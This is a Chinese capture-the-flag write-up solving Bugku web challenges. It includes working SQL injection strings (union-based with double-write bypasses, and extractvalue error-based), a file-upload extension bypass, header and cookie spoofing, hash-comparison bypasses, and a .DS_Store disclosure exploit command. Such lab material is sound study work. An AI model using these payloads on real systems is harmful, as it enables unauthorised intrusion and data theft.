+<p>下面创建字典<code>d</code>，键为<code>value</code>，键值为刚才匹配出的式子的值，<code>eval</code>计算式子的值，<code>group(0)</code>表示匹配的结果，索引从<code>0</code>开始，这里指匹配到的式子。</p>
+<p>以<code>POST</code>方式给<code>url</code>传值，参数<code>data</code>为默认值，不可更改。</p>
+<blockquote>
+<p>ps：参数之所以为data，是因为用burp抓包显示网页传递值的参数就是data，所以不能更改。</p>
+</blockquote>
+<p>最后打印<code>r.text</code>里的内容。</p>
+<p>我直接运行后由于编码报错。</p>
+<p>在终端输入命令<code>chcp 65001</code>，切换到代码所在目录，<code>python xxx.py</code>，就能够正常返回结果。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=速度要快>速度要快<a hidden class=anchor aria-hidden=true href=#速度要快>#</a></h3>
+<blockquote>
+<p>Des:速度要快！！！</p>
+</blockquote>
+<p>查看网页源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>html</span>&gt;
+    &lt;<span style=color:#f92672>head</span>&gt;&lt;/<span style=color:#f92672>head</span>&gt;
+    &lt;<span style=color:#f92672>body</span>&gt;
+        &lt;<span style=color:#f92672>br</span>&gt;
+        &#34;我感觉你得快点!!!&#34;
+        <span style=color:#75715e>&lt;!-- OK, now you have to post the margin what you find --&gt;</span>
+    &lt;/<span style=color:#f92672>body</span>&gt;
+&lt;/<span style=color:#f92672>html</span>&gt;
+</code></pre></div><p>用<code>burp</code>抓包试一下。</p>
+<p>抓包后<code>Response</code>里会有<code>flag </code>的返回值，经过<code>Base64解码</code>后得到一个字符串，提交后显示<code>flag</code>不正确，尝试后发现需要两次<code>Base64解码</code>。再次尝试<code>Request</code>，查看<code>Response</code>，发现<code>flag</code>后的字符串会变化，而我们还需要通过<code>POST</code>传值，写一个<code>python</code>脚本：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests
+<span style=color:#f92672>import</span> base64
+
+url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;url&gt;&#39;</span>
+r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
+headers <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>get(url)<span style=color:#f92672>.</span>headers
+
+mid <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(headers[<span style=color:#e6db74>&#39;flag&#39;</span>])
+mid <span style=color:#f92672>=</span> mid<span style=color:#f92672>.</span>decode() <span style=color:#75715e># 将得到的byte类型值转换为字符串类型，不然使用split()函数会导致类型不匹配报错</span>
+
+flag <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(mid<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;:&#39;</span>)[<span style=color:#ae81ff>1</span>]) <span style=color:#75715e># 截取冒号之后的内容，冒号后有一个空格，所以跳过冒号之后的一个内容</span>
+data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;margin&#39;</span>: flag}
+print(r<span style=color:#f92672>.</span>post(url, data)<span style=color:#f92672>.</span>text)
+</code></pre></div><p>获得<code>flag</code>。</p>
+<h3 id=cookies欺骗>cookies欺骗<a hidden class=anchor aria-hidden=true href=#cookies欺骗>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173230358.png alt=image-20210311173230358>
+</p>
+<p>打开题目看见一大堆字母，猜测是栅栏密码，可是没法解，抓包试一下。</p>
+<p>发现<code>GET</code>请求的是http://xxx.xxx.xxx/index.php?line=&filename=a2V5cy50eHQ=，<code>filename</code>后的字符串经<code>Base64解码</code>后为<code>keys.txt</code>。</p>
+<p>继续观察，发现<code>line</code>并没有赋值，尝试赋值，页面显示空白，查看源码，没有东西。</p>
+<p>下一个思路，尝试用<code>filename</code>访问常见的<code>index.php</code>，先将它进行<code>Base64编码</code>，得到：<code>aW5kZXgucGhw</code>，尝试访问，页面还是显示空白，查看源码，发现有了<code>&lt;php</code>。</p>
+<p>继续尝试给<code>line</code>赋值，<code>line=1</code>时：</p>
+<p><code>line=2</code>时：</p>
+<p>写个<code>python</code>脚本自动更改<code>line</code>赋值：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests
+
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>30</span>):
+    url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;url&gt;/index.php?line=</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&amp;filename=aW5kZXgucGhw&#39;</span><span style=color:#f92672>.</span>format(i) <span style=color:#75715e># 利用format()函数更改line的值</span>
+    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url)
+    print(r<span style=color:#f92672>.</span>text)
+</code></pre></div><p>得到<code>php</code>代码如下：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
+	$file <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_decode</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;filename&#39;</span>])<span style=color:#f92672>?</span>$_GET[<span style=color:#e6db74>&#39;filename&#39;</span>]<span style=color:#f92672>:</span><span style=color:#e6db74>&#34;&#34;</span>);
+	$line <span style=color:#f92672>=</span> <span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;line&#39;</span>])<span style=color:#f92672>?</span><span style=color:#a6e22e>intval</span>($_GET[<span style=color:#e6db74>&#39;line&#39;</span>])<span style=color:#f92672>:</span><span style=color:#ae81ff>0</span>;
+	<span style=color:#66d9ef>if</span> ($file <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;&#39;</span>) <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;location:index.php?line=&amp;filename=a2V5cy50eHQ=&#34;</span>);
+	$file_list <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span> (
+        <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;keys.txt&#39;</span>,
+        <span style=color:#e6db74>&#39;1&#39;</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;index.php&#39;</span>,
+    );
+	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_COOKIE[<span style=color:#e6db74>&#39;margin&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> $_COOKIE[<span style=color:#e6db74>&#39;margin&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;margin&#39;</span>) {
+        $file_list[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;keys.php&#39;</span>;
+    }
+	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($file, $file_list)) {
+        $fa <span style=color:#f92672>=</span> <span style=color:#a6e22e>file</span>($file);
+        <span style=color:#66d9ef>echo</span> $fa[$line];
+    }
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>发现有一个<code>keys.php</code>文件，将其加密后通过<code>filaname</code>访问，空白页面，页面源码为空，尝试<code>burp</code>抓包，并把<code>Cookie</code>改为<code>margin=margin</code>，查看<code>Response</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=never-give-up>never give up<a hidden class=anchor aria-hidden=true href=#never-give-up>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>页面源码如下:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#75715e>&lt;!--1p.html--&gt;</span>
+never never never give up!!!
+</code></pre></div><p>尝试访问<code>1p.html</code>页面，但自动跳转到一个论坛，猜测有重定向头，然后直接查看源码：<code>view-source:http://xxx.xxx.xxx.xxx:xxxx/test/1p.html</code>，获得如下源码：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173325028.png alt=image-20210311173325028>
+</p>
+<p>进行URL解码：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173343036.png alt=image-20210311173343036>
+</p>
+<p>Base64解码：</p>
+<pre tabindex=0><code>!--%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E--
+</code></pre><p>URL解码：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173428719.png alt=image-20210311173428719>
+</p>
+<p>直接访问<code>f4l2a3g.txt</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=welcome-to-bugkuctf>welcome to bugkuctf<a hidden class=anchor aria-hidden=true href=#welcome-to-bugkuctf>#</a></h3>
+<p>题目已挂。</p>
+<h3 id=过狗一句话>过狗一句话<a hidden class=anchor aria-hidden=true href=#过狗一句话>#</a></h3>
+<p>题目已挂。</p>
+<h3 id=字符正则>字符？正则？<a hidden class=anchor aria-hidden=true href=#字符正则>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>打开题目获得代码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#e6db74>&#39;2.php&#39;</span>);
+	$key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;KEY{****************}&#39;</span>;
+	$IM <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&#34;</span>, <span style=color:#a6e22e>trim</span>($_GET[<span style=color:#e6db74>&#34;id&#34;</span>]), $match);
+	<span style=color:#66d9ef>if</span> ($IM) {
+        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;key is:&#39;</span><span style=color:#f92672>.</span>$key);
+    }
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><blockquote>
+<p>. 匹配除 &ldquo;\n&rdquo; 之外的任何单个字符</p>
+<p>* 匹配它前面的表达式0次或多次，等价于{0,}</p>
+<p>{4,7} 最少匹配 4 次且最多匹配 7 次，结合前面就是匹配 4 到 7 个任意字符</p>
+<p>/ 匹配 / ，这里的 \ 是为了转义</p>
+<p>[a-z] 匹配所有小写字母</p>
+<p>[:punct:] 匹配任何标点符号</p>
+<p>/i 表示不分大小写</p>
+</blockquote>
+<p>构造<code>payload</code>：<code>?id=keykeyaaaaakey:/a/keya:</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=前女友>前女友<a hidden class=anchor aria-hidden=true href=#前女友>#</a></h3>
+<p>题目已挂。</p>
+<h3 id=login1>login1<a hidden class=anchor aria-hidden=true href=#login1>#</a></h3>
+<p>题目已挂。</p>
+<h3 id=你从哪里来>你从哪里来<a hidden class=anchor aria-hidden=true href=#你从哪里来>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>使用<code>burp</code>抓包后增加<code>Referer</code>为<code>https://www.google.com</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=md5-collision>md5 collision<a hidden class=anchor aria-hidden=true href=#md5-collision>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>构造<code>?a</code>，回显：</p>
+<p>搜索常见<code>md5碰撞值</code>，本题使用：<code>?a=s878926199a</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=程序员本地网站>程序员本地网站<a hidden class=anchor aria-hidden=true href=#程序员本地网站>#</a></h3>
+<blockquote>
+<p>Des:请从本地访问。</p>
+</blockquote>
+<p>利用插件将<code>XFF</code>修改为<code>127.0.0.1</code>。</p>
+<p>刷新。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=各种绕过>各种绕过<a hidden class=anchor aria-hidden=true href=#各种绕过>#</a></h3>
+<blockquote>
+<p>Des:各种绕过哟。</p>
+</blockquote>
+<p>打开题目获得源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#e6db74>&#39;flag.php&#39;</span>);
+	$_GET[<span style=color:#e6db74>&#39;id&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>urldecode</span>($_GET[<span style=color:#e6db74>&#39;id&#39;</span>]);
+	$flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;flag{xxxxxxxxxxxx}&#39;</span>;
+	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;uname&#39;</span>]) <span style=color:#66d9ef>and</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;passwd&#39;</span>])) {
+        <span style=color:#66d9ef>if</span> ($_GET[<span style=color:#e6db74>&#39;uname&#39;</span>] <span style=color:#f92672>==</span> $POST[<span style=color:#e6db74>&#39;passwd&#39;</span>]) <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#39;passwd can not be unmae.&#39;</span>;
+        <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>sha1</span>($_GET[<span style=color:#e6db74>&#39;uname&#39;</span>]) <span style=color:#f92672>==</span> <span style=color:#a6e22e>sha1</span>($_POST[<span style=color:#e6db74>&#39;passwd&#39;</span>]) <span style=color:#f92672>&amp;</span> ($_GET[<span style=color:#e6db74>&#39;id&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;margin&#39;</span>)) {
+            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Flag:&#39;</span><span style=color:#f92672>.</span>$flag);
+        }
+        <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#39;sorry!&#39;</span>;
+    }
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>分析代码得知，获得flag的条件是<code>uname</code>和<code>passwd</code>不同，且经sha1()函数加密后值相等，<code>id=margin</code>即可获得flag。</p>
+<p>那么我们利用sha1()函数N/A法处理数组的漏洞，首先经过第一处不等判断，在<code>else if</code>里，左边括号假假为真，总括号真真为真。构造<code>payload</code>:<code>?id=margin&uname[]=0</code>，通过hackbar插件POST传参<code>passwd[]=1</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=细心>细心<a hidden class=anchor aria-hidden=true href=#细心>#</a></h3>
+<blockquote>
+<p>Des:想办法变成admin。</p>
+</blockquote>
+<p>打开题目后是一个<code>404</code>页面，源码啥也没有，尝试使用御剑扫描后台目录。</p>
+<p>发现<code>robots.txt</code>，访问：</p>
+<p>访问<code>resusl.php</code>：</p>
+<p>根据下面的<code>GET</code>传参提示，以及之前的题目描述，尝试构造<code>?x=admin</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=求getshell>求getshell<a hidden class=anchor aria-hidden=true href=#求getshell>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>是一个上传文件的题目，页面说的很清楚，只允许上传图片格式的文件，先简单写一个<code>php</code>，修改文件后缀为常见图片格式。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#66d9ef>echo</span>[<span style=color:#e6db74>&#39;Hello&#39;</span>]
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>点击提交， 使用<code>burp</code>抓包。</p>
+<p>然后修改<code>Content-Type:multipart/form-data</code>其中字段的任一值为大写，进行绕过，然后将<code>filename改为xxx.php5</code>，之所以为<code>php5</code>是尝试过其他格式后能正确或的<code>flag</code>的类型，点击提交。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=insert-into注入>INSERT INTO注入<a hidden class=anchor aria-hidden=true href=#insert-into注入>#</a></h3>
+<blockquote>
+<p>Des:不如写个Python吧。</p>
+</blockquote>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
+
+	<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getIp</span>() {
+        $ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
+        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_SERVER[<span style=color:#e6db74>&#39;HTTP_X_FORWARDED_FOR&#39;</span>])) {
+            $ip <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;HTTP_X_FORWARDED_FOR&#39;</span>];
+        } <span style=color:#66d9ef>else</span> {
+            $ip <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;REMOTE_ADDR&#39;</span>];
+        }
+        $ip_arr <span style=color:#f92672>=</span> <span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#39;,&#39;</span>, $ip);
+        <span style=color:#66d9ef>return</span> $ip_arr[<span style=color:#ae81ff>0</span>];
+    }
+
+	$host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;localhost&#34;</span>;
+	$user <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+	$pass <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+	$db <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+	$connect <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_connect</span>($host, $user, $pass) <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Unable to connect&#34;</span>);
+
+	<span style=color:#a6e22e>mysql_select_db</span>($db) <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Unable to select database&#34;</span>);
+
+	$ip <span style=color:#f92672>=</span> <span style=color:#a6e22e>getIp</span>();
+	<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;your ip is:&#39;</span><span style=color:#f92672>.</span>$ip;
+	$sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;insert into client_ip (ip) values (&#39;</span><span style=color:#e6db74>$ip</span><span style=color:#e6db74>&#39;)&#34;</span>;
+	<span style=color:#a6e22e>mysql_query</span>($sql);
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>打开题目后直接显示<code>IP</code>地址。</p>
+<p>这道题直接贴上完整过程的<code>python</code>代码：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173524739.png alt=image-20210311173524739>
+</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173538951.png alt=image-20210311173538951>
+</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173549939.png alt=image-20210311173549939>
+</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=这是一个神奇的登录框>这是一个神奇的登录框<a hidden class=anchor aria-hidden=true href=#这是一个神奇的登录框>#</a></h3>
+<p>题目已挂。</p>
+<h3 id=多次>多次<a hidden class=anchor aria-hidden=true href=#多次>#</a></h3>
+<blockquote>
+<p>Des:本题有2个flag。</p>
+</blockquote>
+<p>修改URL后的<code>id</code>值，<code>id=2</code>时：</p>
+<p><code>id=3</code>时：</p>
+<p><code>id=4</code>时：</p>
+<p><code>id=5</code>时：</p>
+<p>提示<code>SQL注入</code>了。</p>
+<p>构造<code>?id=1' and 1=1 --+</code>，页面回显:</p>
+<p>将<code>and</code>进行双写：<code>?id=1' anandd 1=1 --+ </code>，页面回显正常，可使用双写绕过。</p>
+<p>然后利用异或注入检测被过滤字符，语句:<code>?id=1'^(length('union')!=0)--+</code>。</p>
+<p>若页面回显正常，则说明<code>union</code>字段长度为0，被过滤，继续尝试，<code>and</code>、<code>or</code>、<code>select</code>关键字均被过滤。</p>
+<p>接下来我们进行表名的爆破：<code>?id=-1' uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</code></p>
+<p>字段爆破：<code>?id=-1' uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name='flag1'--+</code></p>
+<p>内容爆破：<code>?id=-1' uunionnion sselectelect 1,group_concat(flag1) from flag1--+</code></p>
+<p>提交后发现并不正确，然后爆破<code>address</code>的内容：<code>?id=-1' uunionnion sselectelect 1,group_concat(address) from flag1--+</code></p>
+<p>跳转：</p>
+<p>大小写和双写绕过都被过滤了。</p>
+<p>使用<code>extrcatvalue()函数</code>进行报错注入。</p>
+<p>爆破库名：<code>?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+</code></p>
+<p>爆破表名：<code>?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='web1002-2'),0x7e))--+</code></p>
+<p>爆破字段：<code>?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag2'),0x7e))--+</code></p>
+<p>爆破内容：<code>?id=1' and extractvalue(1,concat(0x7e,(select group_concat(flag2) from flag2),0x7e))--+</code></p>
+<p>获得<code>flag</code>。</p>
+<h3 id=php_encrypt_1>PHP_encrypt_1<a hidden class=anchor aria-hidden=true href=#php_encrypt_1>#</a></h3>
+<blockquote>
+<p>Des:fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</p>
+</blockquote>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>encrypt</span>($data, $key) {
+	$key <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>(<span style=color:#e6db74>&#39;ISCC&#39;</span>);
+    $x <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+    $len <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>($data);
+    $klen <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>($key);
+    <span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> $len; $i<span style=color:#f92672>++</span>) {
+        <span style=color:#66d9ef>if</span> ($x <span style=color:#f92672>==</span> $klen) {
+            $x <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+        }
+        $char <span style=color:#f92672>.=</span> $key[$x];
+        $x <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>;
+    }
+    <span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> $len; $i<span style=color:#f92672>++</span>) {
+        $str <span style=color:#f92672>.=</span> <span style=color:#a6e22e>chr</span>((<span style=color:#a6e22e>ord</span>($data[$i]) <span style=color:#f92672>+</span> <span style=color:#a6e22e>ord</span>($char[$i])) <span style=color:#f92672>%</span> <span style=color:#ae81ff>128</span>);
+    }
+    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>base64_encode</span>($str);
+}
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>直接贴上解码<code>php</code>脚本：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173616277.png alt=image-20210311173616277>
+</p>
+<p>在配置好环境的<code>Linux</code>终端<code>php xxx.php</code>运行。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=文件包含2>文件包含2<a hidden class=anchor aria-hidden=true href=#文件包含2>#</a></h3>
+<p>题目已挂。</p>
+<h3 id=flagphp>flag.php<a hidden class=anchor aria-hidden=true href=#flagphp>#</a></h3>
+<blockquote>
+<p>Des:点了login咋没反应，提示：hint。</p>
+</blockquote>
+<p>御剑扫描后台，没有有效信息。</p>
+<p>根据提示，<code>GET</code>传参<code>?hint=0</code>，获得代码：</p>
+<pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;?php
+error_reporting(0);
+include_once(&quot;flag.php&quot;);
+$cookie = $_COOKIE['ISecer']; // cookie = 'ISecer'
+if (isset($_GET['hint'])) { // GET传参为hint时，显示此页面
+    show_source(__FILE__);
+}
+elseif (unserialize($cookie) === &quot;$KEY&quot;) { // 反序列化后的cookie为KEY的值，回显flag
+    echo &quot;$flag&quot;;
+}
+else {
+&gt;?
+&lt;html&gt;
+    &lt;head&gt;
+    &lt;meta http-equiv=&quot;Contene-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+    &lt;br&gt;
+    &lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;
+    	&lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;
+    		&lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;
+    		&lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;
+    		&lt;p&gt;&lt;input value=&quot;LOGIN&quot; type=&quot;button&quot;&gt;&lt;/p&gt;
+    	&lt;/form&gt;
+    &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+}
+$KEY = 'IScer:www.iscer.com';
+?&gt;
+</code></pre><p>审计代码得知，变量<code>KEY</code>的值为<code>NULL</code>，测试代码如下：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+	<span style=color:#66d9ef>print</span>(<span style=color:#a6e22e>serialize</span>(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>$KEY</span><span style=color:#e6db74>&#34;</span>));
+	$KEY<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;flag&#39;</span>;
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p><code>s:0:"";</code></p>
+<p>使用<code>burp</code>抓包，添加<code>Cookie:ISecer=s:0:"";</code>。</p>
+<p>点击发送。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=sql注入2>sql注入2<a hidden class=anchor aria-hidden=true href=#sql注入2>#</a></h3>
+<blockquote>
+<p>Des:全都tm过滤了绝望吗？提示： !,!=,=,+,-,^,%</p>
+</blockquote>
+<p>这道题用不上<code>sql</code>注入的方法，可以使用<code>DS Store泄露</code>获得<code>flag</code>。</p>
+<p>利用脚本：<a href=https://github.com/lijiejie/ds_store_exp>lijiejie/ds_store_exp: A .DS_Store file disclosure exploit. It parses .DS_Store file and downloads files recursively. (github.com)</a></p>
+<p><code>python ds_store_exp.py http://xxx.xxx.xxx.xxx:xxxx/web2/.DS_Store</code></p>
+<p>获得<code>flag</code>。</p>
+<h3 id=孙xx的博客>孙xx的博客<a hidden class=anchor aria-hidden=true href=#孙xx的博客>#</a></h3>
+<p>此题已被玩坏。</p>
